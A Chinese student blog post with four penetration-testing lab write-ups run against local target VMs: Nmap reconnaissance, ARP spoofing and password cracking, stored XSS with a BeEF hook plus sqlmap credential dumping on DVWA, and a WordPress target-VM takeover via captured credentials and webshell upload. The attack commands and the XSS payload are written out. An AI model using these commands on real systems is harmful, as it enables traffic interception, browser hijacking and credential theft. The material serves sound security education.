---
title: "网络渗透测试实验合集"
published: 2020-10-26
tags: ["Web安全"]
category: "CTF/靶场WriteUp"
image: api
---

# 网络渗透测试实验一：网络扫描与网络侦察

## 实验目的

+ 理解网络扫描、网络侦察的作用；通过搭建网络渗透测试平台，了解并熟悉常用搜索引擎、扫描工具的应用，通过信息收集为下一步渗透工作打下基础。

## 系统环境

+ Kali Linux 2、Windows

## 网络环境

+ 交换网络结构

## 实验工具

+ Metasploitable2（需自行下载虚拟机镜像）；Nmap（Kali自带）；WinHex、数据恢复软件等

## 实验步骤

### 1. 用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026200649.png)

```
payload:
"network security" filetype:pdf site:www.mit.edu/
```

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026201030.png)

> 搜索内容+ "2019"
>
> `+`号表示同时满足这个加号后面的关键词

![+ ""](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026193716.png)

### 2. 照片中的女生在哪里旅行？截图搜索到的地址信息

> 老社工了

![图片](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026201318.jpg)

> 谷歌地图关键字：Cafe-Brasserie-LeTrentehuit

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026205946.jpg)

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026210123.png)

### 3. 手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置

+ 获取自己手机的LAC和CID：

  Android 获取方法：Android： 拨号\*#\*#4636#\*#\*进入手机信息工程模式后查看

  iphone获取方法：iPhone：拨号\*3001#12345#\*进入FieldTest

  Serving Cell info–>LAC=Tracking Area Code -->cellid = Cell identity

  ![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026211506.png)



![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026211423.png)

### 4. 编码解码

+ 将Z29vZCBnb29kIHN0dWR5IQ==解码。截图。

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026213526.png)

### 5. 地址信息

#### 5.1 内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。

>  猜都能猜到是姚老师拿自己的手机访问桂电......

![MAC](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026215914.png)

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026220031.png)



#### 5.2 访问https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。

> 公网 ip 打码了，怕被搞

![MyIP](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106002812.png)

![ipconifg](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026220321.png)

> 不相同，因为网站查询到的是公网IP，ipconfig查询到的是内网IP

### 6. NMAP的使用

#### 6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。

![扫描端口](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027000326.png)

##### 21端口ftp文件传输协议

该协议是Internet文件传送的基础，它由一系列规格说明文档组成，目标是提高文件的共享性，提供非直接使用远程计算机，使存储介质对用户透明和可靠高效地传送数据。 
 功能： 
 服务器的上传  和下载，Internet上的控制文件的双向传输。同时，它也是一个应用程序（Application）。用户可以通过它把自己的PC机与世界各地所有运行FTP协议的服务器相连，访问服务器上的大量程序和信息。实现各种操作系统之间的文件交流，建立一个统一的文件传输协议。 
 FTP的传输有两种方式：ASCII传输模式和二进制数据传输模式

##### 22端口ssh服务

在进行数据传输之前，SSH先对联机数据包通过加密技术进行加密处理，加密后在进行数据传输。确保了传递的数据安全。SSH是专为远程登录会话和其他网络服务提供的安全性协议。利用 SSH 协议可以有效的防止远程管理过程中的信息泄露问题，在当前的生产环境运维工作中，绝大多数企业普遍采用SSH协议服务来代替传统的不安全的远程联机服务软件，如telnet(23端口，非加密的)等。

SSH还能提供类似FTP服务的sftp-server,借助SSH协议来传输数据的.提供更安全的SFTP服务

##### 23端口telnet远程登陆服务

telnet服务属于典型的客户机/服务器模型，当用telnet登录远程计算机的时候，实际上启动了两个程序：运行在本地计算机的telnet客户端程序；运行在登录的远程计算机上的telnet服务程序

##### 53端口DNS域名解析服务

所提供的服务是用来将主机名和域名转换为IP地址

#### 6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。

![OS](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027105858.png)

#### 6.3 利用NMAP穷举 Metasploitable2上 dvwa 的登录账号和密码。

Nmap 自带有一些脚本，可以用来探测登陆界面或爆破登陆界面，首先判断 dvwa 在 80 端口上，用`http-auth-finder`脚本探测站点上的登录授权页面，发现`/dvwa/login.php`

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027181338.png)

找到和登录授权有关的页面，尝试使用类似于`http-form-brute`的脚本爆破出一些账户密码，`http-form-brute` 传参`--script-args=http-form-brute.path=/dvwa/login.php 192.168.10.227`进行爆破，得到账号`admin`密码`password`

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027182031.png)

#### 6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。

蠕虫病毒会通过远程服务器和自身爬虫功能收集局域网内的IP列表，然后对其中的多个服务端口发起攻击，包括RPC服务(135端口)、SQLServer服务(1433端口)、FTP服务(21端口)，同时还会通过 "永恒之蓝"漏洞，入侵445端口，攻击电脑。

该病毒针对企业不便关闭的多个常用端口进行攻击，并且利用了局域网电脑中普遍未修复的"永恒之蓝"漏洞，一旦任何一台电脑被该病毒感染，将意味着局域网内所有电脑都面临被感染的风险，尤其给政企机构用户造成极大威胁。 

如果病毒成功入侵或攻击端口，就会从远程服务器下载病毒代码，进而横向传播给局域网内其他电脑。同时，该病毒还会在被感染电脑中留下后门病毒，以准备进行后续的恶意攻击，不排除未来会向用户电脑传播更具威胁性病毒的可能性，例如勒索病毒等

### 7、利用 ZoomEye 搜索一个西门子公司工控设备，并描述其可能存在的安全问题。

利用 ZoomEye 搜索到的西门子公司工控设备，其 IP 、开放的端口号、国家等信息暴露出来，可能导致某些服务（例如 SSH、telnet等）被爆破弱口令，进而导致正常服务被破坏

### 8、Winhex简单数据恢复与取证

#### 8.1 elephant.jpg不能打开了，利用WinHex修复，说明修复过程。

象鼻山.jpg的文件头损坏，winhex 打开更改文件头即可

![elephant](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027110849.jpg)

> JPEG (jpg)，文件头：FFD8FF

#### 8.2 笑脸背后的阴霾：图片smile有什么隐藏信息。

用 winhex 打开，拉到最下面发现了`killer`

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027111012.png)

#### 8.3 尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。

![嗨格式](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201104183519.png)

高中的时候帮同学用这个`嗨格式`恢复过U盘文件，现在这软件还是一如既往的好用

###  9. 实验小结

通过本次实验学习到了一些被动扫描的技巧，包括照片定位、通过MAC查询设备以及如何更好的利用搜索引擎，还学习到了 Nmap 的主动扫描技巧，还有一些对文件隐写的常用操作，比如修复损坏的文件头，查看隐藏在文件里的二进制信息等

# 网络渗透测试实验二：网络嗅探与身份认证

## 实验目的

1. 通过使用 Wireshark 软件掌握 Sniffer (嗅探器)工具的使用方法，实现捕捉 HTTP 等协议的数据包，以理解 TCP/IP 协议中多种协议的数据结构、通过实验了解 HTTP 等协议明文传输的特性。
2. 研究交换环境下的网络嗅探实现及防范方法，研究并利用 ARP 协议的安全漏洞，通过 Arpspoof 实现 ARP 欺骗以捕获内网其他用户数据。
3. 能利用 BurpSuite 实现网络登录暴力破解获得登陆密码
4. 能实现 ZIP 密码破解，理解安全密码的概念和设置

## 系统环境

+ Kali Linux2、Windows

## 网络环境

+ 交换网络结构

## 实验工具

+ Arpspoof、WireShark、Burpsuite、fcrackzip(用于 zip 密码破解)

## 实验步骤

### 网络嗅探部分：

+ 网络嗅探：Wireshark 监听网络流量，抓包
+ ARP 欺骗：ArpSpoof，实施 ARP 欺骗
+ 防范：防范 ARP 欺骗

![实验网络拓扑](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106143101.png)

#### 1、A 主机上外网， B 主机运行 sniffer(WireShark)选定只抓源为 A 的数据

本次实验开了一台 Kali 当主机 A ，开了一台 win7 虚拟机当主机 B ，首先开 nmap 扫一扫，确定一下目标主机 IP 并看看能不能 ping 通，`Aimerl0-PC.lan`就是 win7 主机，`.lan`表示使用有线网络

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106145957.png)

虽然 nmap 用了 -sP 扫描，但还是 ping 一下，没有丢包，很满意

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106150341.png)

接着用 win7 ping 一下 kali ，打开 Wireshark 抓一下包，过滤语句：

```
ip.src == 192.168.10.204
```

   ![ping](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106165111.png)

具体打开 ping 过去的包看看，还是能够看到 ping 的内容的

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106165333.png)、

   #### 2、ARP 欺骗

#### 2.1 为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？

> 在局域网中，B 主机冒充的是子网中的网关

#### 2.2 写出 arpspoof 命令格式

首先，我的新 kali 里面没有安装 arpspoof ，所以简单安装了一个

```
sudo apt-get install dsniff
```

然后需要开启端口转发，不然截获到的报文无法转发出去，B 主机就没法上网了

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

再然后开始攻击，因为跟受害主机在同一个网段，所以网关肯定都是`192.168.10.1`，之前又扫到了目标主机的 IP 为`192.168.10.204`，所以能够直接开锤，简单看一下 arpspoof 使用方法

```
root@F0x:~# arpspoof
Version: 2.4
Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host

arpspoof [-i 指定使用的网卡] [-t 要欺骗的目标主机] [-r] 要伪装成的主机
```

kali 的 IP 是`192.168.10.165`，要欺骗的目标主机 IP 是`192.168.10.204`，网关是`192.168.10.1`，思路一下子就清晰起来了，我们目的就是把 kali 伪装成网关，结合 arpspoof 

+ 攻击者：`192.168.10.165`
+ 被欺骗主机：`192.168.10.204`
+ 网关：`192.168.10.1`

payload：

```
arpspoof -i eth0 -t 192.168.10.204 -r 192.168.10.1
```

#### 2.3&2.4 是否能看到A和外网的通信（A刚输入的帐户和口令）？在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，截图Wireshark中显示的明文信息。

然后我在 win7 上登陆了一下 `某某大学的bkjw2`，检查了一下发现可以连上网，然后回到 kali 开始流量分析，然后抓到了自己的账号密码，果然是明文传输的，密码自行打码了

![明文密码](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106172557.png)

#### 3、FTP数据还原部分：利用WireShark打开实验实验数据data.pcapng

#### 3.1  FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？

用 ftp 过滤流，发现一堆流量

Response 是响应的意思，应该就是 FTP 服务器响应客户端请求，所以 IP 地址是`192.168.182.1`

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106175557.png)

#### 3.2 客户端登录FTP服务器的账号和密码分别是什么?

一图两用，账号`student`，密码`sN46i5y`，上面还有个匿名用户`anonymous`登陆的

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106175557.png)

#### 3.3 客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？提示：文件名有可能是中文.

分析流量看到`1.zip`和`复习题.txt`

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106175939.png)

#### 3.4 还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。

根据 zip 的`504B0304`可以找到流量，再以原始数据保存成`2.zip`到桌面

![504B0304](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106180544.png)

然后我用了`ARCHPR`软件来爆破，爆破到密码为`123456`，解压得到图片

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106181039.png)

![🐧](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106181131.jpg)

#### 3.5 TXT文件的内容是什么？

分析流量，找到`复习题.txt`的 ==FTP-DATA==，表示文件传输，看到数据内容

![data](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106181637.png)

### 网站密码破解部分：

以 xxxx 为目标网站，构造字典（wordlist），其中包含你的正确密码，利用 burpsuite 进行字典攻击，实施字典攻击，你是如何判断某个密码为破解得到的正确密码，截图。

+ 这里找到了原来搭的`pikachu`靶场，桌面新建`list.txt`，里面存有一些密码，比如

```
123456
000000
abc123
```

开 burpsuite 抓包，send to inturder ，payload 页面点 load 导入桌面的`list.txt`，开始爆破

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106182535.png)

正确密码或者特殊密码的长度会不同，所以判断`abc123`就是密码

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106182627.png)

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106182747.png)

### MD5破解部分：

SqlMap得到某数据库用户表信息，用户口令的MD5值为7282C5050CFE7DF5E09A33CA456B94AE

那么，口令的明文是什么？（提示：MD5值破解）

随便找个在线解密网站，得到明文`iampotato`

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106183031.png)

### John the Ripper的作用是什么？

John 是一款老牌的暴力破解密码的工具，拥有自带的字典，可以用来爆破一些简单的弱口令密码

### 思考问题：

#### 谈谈如何防止ARP攻击

+ 静态绑定IP地址和MAC地址
+ 双绑措施，在路由器和终端上都进行IP-MAC绑定的措施，它可以对ARP欺骗的两边，伪造网关和截获数据，都具有约束的作用。这是从ARP欺骗原理上进行的防范措施，也是最普遍应用的办法。它对付最普通的ARP欺骗是有效的
+ 安装 ARP 防火墙

#### 安全的密码（口令）应遵循的原则

+ 不能是弱密码（123456、admin、root、88888888）
+ 各个平台的密码有自己的特征
+ 不要带有自己的生日或者名字缩写等容易被社工到的信息，可能会被组合成密码字典进行爆破

#### 谈谈字典攻击中字典的重要性

+ 一个弱口令字典常常是打开渗透突破口的第一步
+ 通过社会工程学组合而成的字典杀伤力很大，能提高密码爆破的成功率
+ 一些可以用来 fuzzing 的字典可以测试网站的 waf ，比如过滤掉了哪些字符串

#### 实验小结

本次实验最重要的就是学到了 ARP 协议和 ARP 欺骗，以前只是听说过，这回仔细找资料并且动手实践了，其次还明白了密码的重要性，最后是对 Wireshark 软件的使用更加熟练了一些，流量分析也学到了不少简练的操作

# 网络渗透测试实验三：XSS 和 SQL 注入

## 实验目的

+ 了解什么是XSS

+ 了解XSS攻击实施，理解防御XSS攻击的方法

+ 了解SQL注入的基本原理

+ 掌握PHP脚本访问MySQL数据库的基本方法

+ 掌握程序设计中避免出现SQL注入漏洞的基本方法

+ 掌握网站配置。

## 系统环境

+ Kali Linux2、Windows Server

## 网络环境

+ 交换网络结构

## 实验工具

+ Beef
+ AWVS
+ Sqlmap
+ DVWA

## 实验步骤

### XSS部分：利用 Beef 劫持被攻击者客户端浏览器

+ 实验环境搭建：

角色：留言簿网站。存在XSS漏洞；（IIS或Apache、guestbook搭建）
攻击者：Kali（使用beEF生成恶意代码，并通过留言方式提交到留言簿网站）；
被攻击者：访问留言簿网站，浏览器被劫持。

> 搭建教程网站：[本地win7系统下ASP网站环境搭建](https://blog.csdn.net/qq_41865652/article/details/107459482?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160554665919725255539382%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=160554665919725255539382&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-2-107459482.pc_first_rank_v2_rank_v28&utm_term=win7+asp%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA&spm=1018.2118.3001.4449)

搭建成功：

![搭建成功](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117012821.png)

1. 利用 AWVS 扫描留言簿网站，发现存在 XSS 漏洞，截图

![发现漏洞](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117022801.png)

> 这里还看到了一个 `HTTP.sys`远程代码执行漏洞，稍微看了一下，还是个二进制漏洞，metasploit已经收录而且能直接把受害主机打蓝屏，真不错
>
> [每日漏洞 | HTTP.sys远程代码执行](https://www.freebuf.com/column/202763.html)
>
> [HTTP.sys远程代码执行漏洞](https://www.jianshu.com/p/33569386dea9)

1. kali 使用 Beef 生成恶意代码，截图

> 很遗憾，我的新版 kali 依旧是没有 beef ，果断选择安回所有工具
>
> >apt-get -y install kali-linux-default #渗透测试的基本工具
> >apt-get -y install kali-linux-large #更广泛的工具
> >apt-get -y install kali-linux-everything #所有工具
> >
> >> 然后还是没有 beef 
> >>
> >> 自己安装了一个`apt-get install beef-xss`

打开 beef 的时候遇到了一个报错，说不能使用默认的账号密码（beef beef），去对应路径下找到文件自己改一个新的账号密码就行了

```
[!] ERROR: Don't use default username and password!
[15:18:15]    |_  Change the beef.credentials.passwd in /etc/beef-xss/config.yaml
```

![shellcode](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117042700.png)

1. 访问 http://留言簿网站/message.asp，将以下恶意代码写入网站留言板，截图

```javascript
<script src="http://192.168.17.132:3000/hook.js"></script>
```

4. 管理员登录 login.html，账号密码均为 admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在 beff 中的配置截图

> 没有选择跳到学校主页，选择了跳到自己的博客主页

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117045535.png)

![blog](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117050240.png)

4. 回答问题：实验中 XSS 攻击属于哪种类型？

> 存储型 XSS

### SQL 注入部分：DVWA + SQLmap + Mysql 注入实战

+ 实验环境搭建。启动 Metasploitable2 虚拟机

1. 在输入框输入1，返回
   > ID: 1
   > First name: admin
   > Surname: admin
   
   返回正常；
   再次输入1'，报错，返回
   
   > You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
   
   此时可以断定有SQL注入漏洞，
   http://IP地址/DVWA-master/vulnerabilities/sqli/?id=22&Submit=Submit#
   下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；
   
2. 枚举当前使用的数据库名称和用户名

![sqlmap](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117004441.png)

> 用 sqlmap 直接扫的时候遇到了个问题，存在 `302` 跳转页面，扫的时候会直接跳回 `login.php` 登录页面，所以需要加 `cookie` 来扫
>
> > 退回登录页面，抓包拿到 cookie 
> >
> > `security=low; PHPSESSID=f383161ec8314206ec01076f9b34b866`

![302](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117032106.png)

你输入的命令：

> sqlmap -u "http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&Submit=Submit#" --cookie='security=low;PHPSESSID=f383161ec8314206ec01076f9b34b866' -b --current-db --current-user 

Sqlmap 输出截图：

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117033022.png)

3. 枚举数据库用户名和密码

![sqlmap](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117004609.png)

你输入的命令：

> sqlmap -u "http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&Submit=Submit#" --cookie='security=low;PHPSESSID=f383161ec8314206ec01076f9b34b866' --users --password --batch

Sqlmap 输出截图

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117035518.png)

4. 枚举数据库

`--dbs`：枚举所有数据库

你输入的命令：

> sqlmap -u "http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&Submit=Submit#" --cookie='security=low;PHPSESSID=f383161ec8314206ec01076f9b34b866' --dbs

Sqlmap 输出截图：

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117035651.png)

5. 枚举数据库和指定数据库的数据表

`-D 数据库名`：指定数据库

`--tables`：枚举指定数据库的所有表

你输入的命令：

> sqlmap -u "http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&Submit=Submit#" --cookie='security=low;PHPSESSID=f383161ec8314206ec01076f9b34b866' -D dvwa --tables

Sqlmap 输出截图：

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117035817.png)

6. 获取指定数据库和表中所有列的信息

`-D 数据库名`：指定的数据库

`-T 指定数据表名`：指定数据库中的数据表

`--columns`：获取列的信息

你输入的命令：

> sqlmap -u "http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&Submit=Submit#" --cookie='security=low;PHPSESSID=f383161ec8314206ec01076f9b34b866' -D dvwa -T users --columns
>
> sqlmap -u "http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&Submit=Submit#" --cookie='security=low;PHPSESSID=f383161ec8314206ec01076f9b34b866' -D dvwa -T guestbook --columns

Sqlmap 输出截图：

![users](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117040003.png)

![guestbook](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117040102.png)

7. 枚举指定数据表中的所有用户名和密码，并 down 到本地

`-C 指定数据表中的列`：枚举数据表中的列

`--dump`：存储数据表项

你输入的命令：

> sqlmap -u "http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&Submit=Submit#" --cookie='security=low;PHPSESSID=f383161ec8314206ec01076f9b34b866' -D dvwa -T users -C user password --dump

Sqlmap 输出截图：

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117040932.png)

查看 down 到本地的用户名和密码，截图。

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117041143.png)

# 网络渗透测试实验四：WebDeveloper靶机rootshell

首先自然是下载好靶机，放 VMware 里，在此感谢大佬同学提供的校内网盘，下载速度很快，孩子很喜欢

![webdeveloper](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202224343.png)

本次实验的网络环境是把主攻手：kali 和受害主机：WebDeveloper 放在了同一个网段，都用 `NAT` 模式接入网络

靶机开好了自然是不能动了，接下来开 `nmap` 扫一扫，先扫存活主机，简单排除一下，确定`192.168.17.134`为靶机 IP 地址

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202225036.png)

接着扫开放端口，发现开放了两个端口，分别是`80`（猜测是web网站服务）和`22`的 ssh 端口

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202225245.png)

访问一下`192.168.17.134`，发现是个 `wordpress`搭的站，老熟人了

![WordPress](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202225629.png)

然后进行常规的信息收集，不急，先扫目录，直接开 kali 里的 `dirb` 来扫，payload：

```
dirb http://192.168.17.134/ -o result.txt
```

`-o result.txt` 是将结果生成一个 `result.txt` 保存在家目录`~`里，`result.txt`：

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: result.txt
START_TIME: Wed Dec  2 10:16:40 2020
URL_BASE: http://192.168.17.134/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------
GENERATED WORDS: 4612
---- Scanning URL: http://192.168.17.134/ ----
+ http://192.168.17.134/index.php (CODE:301|SIZE:0)
==> DIRECTORY: http://192.168.17.134/ipdata/
+ http://192.168.17.134/server-status (CODE:403|SIZE:302)
==> DIRECTORY: http://192.168.17.134/wp-admin/
==> DIRECTORY: http://192.168.17.134/wp-content/
==> DIRECTORY: http://192.168.17.134/wp-includes/
+ http://192.168.17.134/xmlrpc.php (CODE:405|SIZE:42)

---- Entering directory: http://192.168.17.134/ipdata/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.17.134/wp-admin/ ----
+ http://192.168.17.134/wp-admin/admin.php (CODE:302|SIZE:0)
==> DIRECTORY: http://192.168.17.134/wp-admin/css/
==> DIRECTORY: http://192.168.17.134/wp-admin/images/
==> DIRECTORY: http://192.168.17.134/wp-admin/includes/
+ http://192.168.17.134/wp-admin/index.php (CODE:302|SIZE:0)
==> DIRECTORY: http://192.168.17.134/wp-admin/js/
==> DIRECTORY: http://192.168.17.134/wp-admin/maint/
==> DIRECTORY: http://192.168.17.134/wp-admin/network/
==> DIRECTORY: http://192.168.17.134/wp-admin/user/

---- Entering directory: http://192.168.17.134/wp-content/ ----
+ http://192.168.17.134/wp-content/index.php (CODE:200|SIZE:0)
==> DIRECTORY: http://192.168.17.134/wp-content/languages/
==> DIRECTORY: http://192.168.17.134/wp-content/plugins/
==> DIRECTORY: http://192.168.17.134/wp-content/themes/
==> DIRECTORY: http://192.168.17.134/wp-content/upgrade/
==> DIRECTORY: http://192.168.17.134/wp-content/uploads/

---- Entering directory: http://192.168.17.134/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.17.134/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.17.134/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.17.134/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.17.134/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.17.134/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.17.134/wp-admin/network/ ----
+ http://192.168.17.134/wp-admin/network/admin.php (CODE:302|SIZE:0)
+ http://192.168.17.134/wp-admin/network/index.php (CODE:302|SIZE:0)

---- Entering directory: http://192.168.17.134/wp-admin/user/ ----
+ http://192.168.17.134/wp-admin/user/admin.php (CODE:302|SIZE:0)
+ http://192.168.17.134/wp-admin/user/index.php (CODE:302|SIZE:0)

---- Entering directory: http://192.168.17.134/wp-content/languages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.17.134/wp-content/plugins/ ----
+ http://192.168.17.134/wp-content/plugins/index.php (CODE:200|SIZE:0)

---- Entering directory: http://192.168.17.134/wp-content/themes/ ----
+ http://192.168.17.134/wp-content/themes/index.php (CODE:200|SIZE:0)

---- Entering directory: http://192.168.17.134/wp-content/upgrade/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.17.134/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Wed Dec  2 10:17:25 2020
DOWNLOADED: 32284 - FOUND: 12
```

里面泄露了很多敏感的目录，比如后台登录路径`wp-admin`，文件上传路径`wp-content/uploads/`但是最奇怪的是这一个`http://192.168.17.134/ipdata/`，进来下载了一个文件`analyze.cap`

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202232211.png)

用`winhex`打开发现一段 `http请求头` ，感觉是个流量文件，再用`wireshark`打开

![winhex](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202232727.png)

分析流量，直接看`http`的流量包，发现有对`wp-login.php`页面以`POST`模式发出请求的流量包，查看包的表单信息发现能登录成功的账号密码

账号：`webdeveloper`

密码：`Te5eQg&4sBS!Yr$)wf%(DcAd`

> 1. 登录页面的账号密码一般是将账号密码存入表单采用 `POST` 模式提交请求，所以重点找 `POST` 的包
> 2. 分析流量发现在发送登录请求过后，返回的状态码是`200 OK`，由此判断这个账号密码是正确的账号密码

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202233557.png)

然后访问后台登录的 url ，登录进入后台

![后台](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202233726.png)

进入后台自然是寻找文件上传的接口，然后传🐎 getshell ，发现有很多处能够攻击的点

+ 直接上传插件，直接传 php 的🐎，路径`/wp-content/uploads/year/month/xx.php`，比如`/wp-content/uploads/2020/12/horse.php`

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202234216.png)

+ 编辑已安装插件的 php 文件，在里面添加一句话木马，再启用插件也可以达到攻击目的

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203005031.png)

+ 编辑主题里的模板页面（也是 php 页面），在里面添加一句话木马，比如在`404.php`页面文件中添加木马，访问到 404 页面就能达到攻击目的

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203005546.png)

